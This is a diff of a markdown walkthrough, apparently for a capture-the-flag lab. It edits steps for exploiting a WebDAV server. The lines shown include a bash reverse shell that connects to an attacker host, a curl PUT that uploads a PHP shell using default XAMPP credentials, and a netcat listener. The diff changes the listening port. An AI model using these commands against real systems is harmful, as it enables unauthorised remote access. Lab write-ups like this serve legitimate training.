@@ -136,7 +136,7 @@ dav:/webdav/>
 
 ![image](https://github.com/user-attachments/assets/23b64686-dfca-4f6e-a1b5-c96a3b0cd238)
 
-<pre><code>sh -i >& /dev/tcp/[Attack]/8080 0>&1
+<pre><code>sh -i >& /dev/tcp/[Attack]/2222 0>&1
 </code></pre><br>
 
 <pre><code># root@ip-[Attack]:~# curl -u "wampp:xampp" -X PUT http://[Target]/webdav/shell.php
@@ -148,19 +148,15 @@ dav:/webdav/>
 <p>Resource /webdav/revhsell has been created.</p>
 <hr />
 <address>Apache/2.4.18 (Ubuntu) Server at 10.10.180.121 Port 80</address>
-</body></html>
+</body></html></pre></code>
 
+<br>
 
-![image](https://github.com/user-attachments/assets/82f2ddb8-173c-4368-862e-8cec0c691b70)
+![image](https://github.com/user-attachments/assets/475581d3-a920-42d2-9187-8d1bcfe2a6f3)
 
-<pre><code># dav:/webdav/> put shell.php
-Uploading shell.php to `/webdav/shell.php':
-Progress: [=============================>] 100.0% of 42 bytes succeeded.
-dav:/webdav/> 
-</code></pre><br>
+<br>
 
-
-<pre><code># root@ip-[Attack]:~# nc -lvnp 8080
+<pre><code># root@ip-[Attack]:~# nc -lvnp 2222
 Listening on [0.0.0.0] (family 0, port 8080)
 </code></pre><br>
 
